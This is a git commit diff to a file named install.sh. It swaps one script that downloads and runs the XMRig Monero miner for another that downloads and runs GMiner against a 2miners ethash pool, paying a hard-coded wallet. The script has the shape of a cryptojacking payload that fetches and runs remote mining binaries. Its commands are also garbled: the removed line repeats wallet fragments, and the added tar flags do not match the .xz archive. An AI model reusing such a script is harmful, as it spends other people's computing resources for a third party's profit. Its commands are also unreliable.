2558647d9aaae01af42e07bbf39e2d3e17b9319d
onamena <82048147+onamena@users.noreply.github.com>
2021-04-08 08:59:53 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,5 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz
-tar xzvf xmrig-6.7.0-linux-x64.tar.gz
-rm xmrig-6.7.0-linux-x64.tar.gz
-./xmrig-6.7.0/xmrig -o monerohash.com:9999 -u 48xoAqhD1QaZMTr2KYi8VpQWQkQ7z1y7uj6rSvQWBBLe88YRnEWqAjxNgwUnRAhzheYtBUhgws6JGHsq67WtjY4q7nEBKi9 -k --tlsAqhD1QaZMTr2KYi8VpQWQkQ7z1y7uj6rSvQWBBLe88YRnEWqAjxNgwUnRAhzheYtBUhgws6JGHsq67WtjY4q7nEBKi9 -k --tls
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.50/gminer_2_50_linux64.tar.xz
+tar xzvf gminer_2_50_linux64.tar.xz
+rm gminer_2_50_linux64.tar.xz
+
+./miner --algo ethash --server asia-eth.2miners.com:2020 --user 0xc6601e3308cfe311faa2236b9578ae3cfad2c82a.BEST_NEW
